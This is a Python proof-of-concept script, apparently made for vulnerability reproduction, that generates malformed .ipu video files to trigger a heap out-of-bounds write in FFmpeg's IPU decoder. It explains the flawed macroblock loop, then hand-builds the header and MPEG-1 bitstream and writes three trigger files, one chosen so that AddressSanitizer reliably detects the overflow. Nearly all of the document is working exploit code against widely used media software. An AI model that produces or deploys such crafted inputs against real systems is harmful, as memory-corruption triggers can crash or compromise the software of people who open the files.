#!/usr/bin/env python3
"""
PoC generator for VULN 001: ipu_decode_frame Heap OOB Write via Non-Aligned Height

The IPU file format header (16 bytes):
  0-3:   'ipum' magic (big-endian ASCII)
  4-7:   any non-zero LE32
  8-9:   width  (LE16)
  10-11: height (LE16)
  12-15: nb_frames (LE32)

The decoder ipu_decode_frame (mpeg12dec.c) uses ff_get_buffer which allocates
a frame for exactly avctx->height rows. The MB y-loop runs for y=0,16,32,...
up to y < avctx->height. For each MB, idct_put writes to rows y and y+8.
When height is not a multiple of 16 (e.g., height=1), the write at row y+8
(e.g., row 8 for y=0 with height=1) is past the end of the allocated luma plane.

For height=17: OOB write is at row 24. BUT with YUV420P for 16x17:
  luma=16*17=272 bytes, then chroma planes follow. Row 24 offset=384 falls
  inside the chroma plane region of the same allocation -> ASAN won't catch.

For height=1: OOB write at row 8. Allocation is tiny (luma=16 bytes with
linesize=16, or 32 bytes with linesize=32). Row 8 offset=128-256 is completely
past the entire buffer -> ASAN WILL catch.

For height=1: only 1 MB to decode (y=0 only), then idct_put at y+8=8 is OOB.

MPEG-1 intra block encoding (flags=0x80):
  - Luma DC size=0 (diff=0): VLC "100" (3 bits, code=0x4)
  - Chroma DC size=0 (diff=0): VLC "00" (2 bits, code=0x0)
  - AC EOB: bitpattern "10" (2 bits, detected by cache check, consumed by
    LAST_SKIP_BITS at end: label in ff_mpeg1_decode_block_intra)
"""

import struct
import sys

def build_ipu(width, height):
    """Build a minimal .ipu file with the given dimensions.

    For the trigger: height must be non-multiple of 16.
    Optimal choice: height=1 (smallest buffer, OOB write at row 8 is
    clearly past all allocations).
    """
    assert height > 0
    mb_cols = (width + 15) // 16
    mb_rows = (height + 15) // 16

    # ---- Header (16 bytes) ----
    header = (
        b'ipum'                          # 0-3: magic (big-endian)
        + struct.pack('<I', 1)           # 4-7: non-zero (probe requirement)
        + struct.pack('<H', width)       # 8-9: width
        + struct.pack('<H', height)      # 10-11: height (trigger!)
        + struct.pack('<I', 1)           # 12-15: nb_frames=1
    )
    assert len(header) == 16

    # ---- Build bitstream bit by bit ----
    # Flags byte = 0x80: enables MPEG-1 coding (ff_mpeg1_decode_block_intra)
    bits = [1, 0, 0, 0, 0, 0, 0, 0]  # flags = 0x80

    for mb_row in range(mb_rows):
        y = mb_row * 16
        for mb_col in range(mb_cols):
            x = mb_col * 16
            if x != 0 or y != 0:
                bits.append(1)   # continue bit (must be 1)
            bits.append(1)       # intraquant bit = 1 -> intraquant=0 (no new qscale)

            # 4 luma blocks: luma DC "100" (3 bits) + EOB "10" (2 bits) = 5 bits each
            for _ in range(4):
                bits.extend([1, 0, 0])   # DC luma size=0 VLC code "100"
                bits.extend([1, 0])      # EOB "10"

            # 2 chroma blocks: chroma DC "00" (2 bits) + EOB "10" (2 bits) = 4 bits each
            for _ in range(2):
                bits.extend([0, 0])      # DC chroma size=0 VLC code "00"
                bits.extend([1, 0])      # EOB "10"

    # align_get_bits: pad to next byte boundary
    while len(bits) % 8 != 0:
        bits.append(0)

    # Need get_bits_left(gb) == 32 after alignment -> add 32 bits (4 bytes)
    bits.extend([0] * 32)

    # Pack bits into bytes (MSB first)
    assert len(bits) % 8 == 0
    data = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | bits[i + j]
        data.append(byte)

    return header + bytes(data)


def main():
    import os

    # Primary: height=1 (maximum OOB distance, smallest allocation)
    # The luma plane is just 1 row; idct_put writes to row 8, which is
    # 7+ rows (112+ bytes) past the end of a 16-32 byte luma plane.
    # ASAN should catch this as heap-buffer-overflow.
    configs = [
        (16, 1,  "vuln_001_input.ipu"),         # attempt 1: most aggressive
        (16, 17, "vuln_001_input_h17.ipu"),      # attempt 2: as described in vuln report
        (16, 15, "vuln_001_input_h15.ipu"),      # attempt 3: h=15 (OOB at rows 8-15)
    ]

    for width, height, fname in configs:
        data = build_ipu(width, height)
        with open(fname, 'wb') as f:
            f.write(data)
        mb_rows = (height + 15) // 16
        mb_cols = (width + 15) // 16
        oob_row = (mb_rows - 1) * 16 + 8
        print(f"Generated {fname}: {len(data)} bytes, {width}x{height}, "
              f"MBs={mb_cols}x{mb_rows}, OOB row={oob_row} (alloc={height} rows)")

    print(f"\nPrimary: vuln_001_input.ipu (height=1)")
    print(f"  Luma allocation: ~{16} bytes (1 row x 16 width)")
    print(f"  idct_put write at row 8: offset=128 bytes past start (OOB!)")


if __name__ == '__main__':
    main()
